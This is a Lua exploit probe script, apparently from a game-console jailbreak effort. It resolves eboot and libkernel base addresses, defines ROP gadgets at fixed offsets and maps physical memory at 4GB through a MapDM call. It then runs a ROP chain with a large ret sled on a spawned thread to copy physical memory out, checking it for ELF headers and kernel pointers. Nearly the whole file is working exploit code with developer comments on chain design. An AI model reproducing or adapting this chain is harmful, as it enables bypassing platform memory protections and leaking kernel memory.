-- CRASH_CLASS: MODERATE
-- PROBE 562d: Child thread with spin-loop exit (no crash, no binary dump)
--
-- 562c proved: binary "77" comes from child crash (ret sled → fault).
-- MapDM alone is clean. Fix: end child ROP with infinite spin.
--
-- Spin strategy: after sentinel write, child does:
--   label: bare_ret → bare_ret → ... (but ret pops, so we need SELF-REFERENCING)
--   Actually: use mov [rdi],rax;ret to OVERWRITE the next return address
--   with the address of the mov instruction itself. Then it loops:
--   mov [rdi],rax → ret → pops [rsp] = addr_of_mov → loops forever
--
-- Cleaner: use jmp rel8 at a known location.
-- Even cleaner: just write the address of bare_ret TO the stack slot
-- that bare_ret will return to. If *rsp = addr_of(bare_ret), then:
--   ret → pops addr_of(bare_ret) → bare_ret executes ret → pops NEXT qword
-- That still advances RSP. Won't loop.
--
-- TRUE LOOP: write addr of bare_ret to [rsp+8] using mov [rdi],rax
-- where rdi=rsp+8 and rax=addr_of_self. But we can't read rsp.
--
-- SIMPLEST: make a HUGE ret sled (like 500 entries). The child will
-- spend time popping, and we read the result before it crashes.
-- Or use 0xF4 (HLT instruction) - but that's privileged.
--
-- ACTUALLY: if the "77" dump is from the crash SIGNAL HANDLER, and we
-- read the shared buffer BEFORE the crash happens, we get clean output.
-- The ret sled with 500+ entries gives us time.
--
-- Let's try: 1000 bare_ret entries = 8000 bytes of stack, plenty of time.

print("=== PROBE 562d: LARGE RET SLED ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do wd(buf + off, 0) end
end

local Z = uint64(0)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Eboot + libkernel
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", eb_hi, eb_lo, lk_hi, lk_lo))
io.flush()

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)
local bare_ret        = eboot + uint64(0x42)

-- MapDM phys 0x100000000 (4GB)
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print(string.format("MapDM rv=%d", md_rv))
io.flush()

-- Shared buffer
local shared = memory.alloc(0x200)
zero(shared, 0x200)
local nq = 16

-- Large stack for huge ret sled (256KB)
local ss = 0x40000
local ok_stk, sb = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
if not ok_stk then
    print("stack alloc fail")
    return
end

-- RSP at top of stack
local sb_n = N(sb)
local rsp_n = (sb_n + ss) - ((sb_n + ss) % 16) - 8
local rsp = sb + uint64(rsp_n - sb_n)

local ci = 0
local function wc(val) wq(rsp + uint64(ci * 8), val); ci = ci + 1 end

-- Read 16 qwords from mapped page → shared+8
for qi = 0, nq - 1 do
    wc(pop_rsi_ret)
    wc(mapped_va + uint64(qi * 8))
    wc(mov_rax_mem_rsi)
    wc(pop_rdi_ret)
    wc(shared + uint64(8 + qi * 8))
    wc(mov_mem_rdi_rax)
end

-- Write sentinel to shared+0
wc(pop_rax_ret)
wc(uint64("0xDEADFACE"))
wc(pop_rdi_ret)
wc(shared)
wc(mov_mem_rdi_rax)

-- HUGE ret sled: fill remaining stack with bare_ret addresses
-- This delays the crash, giving main thread time to read + print
local chain_used = ci * 8
local remaining = ss - 0x800 - chain_used  -- leave safety margin
local sled_count = math.floor(remaining / 8)
sled_count = math.min(sled_count, 4000)  -- cap at 4000

-- Pre-fill the stack region after our chain with bare_ret
for i = 0, sled_count - 1 do
    wq(rsp + uint64((ci + i) * 8), bare_ret)
end

print(string.format("chain=%d entries, sled=%d entries", ci, sled_count))
io.flush()

-- Spawn
local pa = memory.alloc(0x40)
zero(pa, 0x40)
wq(pa + 0x00, bare_ret)
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid = memory.alloc(8)
wq(pa + 0x30, uint64(tid))

pcall(function() sc455(uint64(pa), uint64(0x38)) end)

-- Wait for sentinel
local sentinel = 0
for wait = 1, 3000 do
    for j = 1, 200 do local x = j * j end
    sentinel = rb(shared) or 0
    if sentinel == 0xDEADFACE then break end
end

-- Read and print results IMMEDIATELY (before child crashes through sled)
print("")
if sentinel == 0xDEADFACE then
    print("SENTINEL OK!")
    print(string.format("phys=0x100000000 (4GB) 16 qwords:"))
    for qi = 0, nq - 1 do
        local lo = rb(shared + 8 + qi * 8) or 0
        local hi = rb(shared + 8 + qi * 8 + 4) or 0
        local tag = ""
        if qi == 0 and lo == 0x464C457F then tag = " *** ELF! ***" end
        if hi >= 0xFFFF8000 then tag = tag .. " KPTR?" end
        print(string.format("  [+%02X] %08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print(string.format("TIMEOUT sentinel=0x%X", sentinel))
end

io.flush()

-- Kill child (best effort)
local ctid_lo = rb(tid) or 0
if ctid_lo > 0 then
    local sc433 = mk(433)
    pcall(function() sc433(uint64(ctid_lo), uint64(9)) end)
end

-- Cleanup
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(sb, uint64(ss)) end)

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 562d DONE ===")
